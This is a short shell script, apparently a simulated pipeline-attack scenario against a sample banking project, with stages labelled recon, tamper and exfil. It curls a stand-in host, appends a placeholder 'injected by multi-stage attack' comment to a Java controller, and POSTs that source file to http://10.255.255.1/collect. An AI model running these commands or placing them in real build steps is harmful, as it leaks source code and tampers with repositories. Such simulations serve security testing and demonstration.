#!/bin/sh
echo "[stage 1] recon: fingerprinting external host"
curl -m 3 http://10.255.255.1/recon || true

echo "[stage 2] tamper: injecting backdoor into source"
echo "// injected by multi-stage attack" >> src/main/java/com/pipejack/banking/controller/AccountController.java

echo "[stage 3] exfil: sending source to attacker"
curl -m 3 -X POST --data-binary @src/main/java/com/pipejack/banking/controller/AccountController.java http://10.255.255.1/collect || true

echo "[attack] multi-stage attack complete"
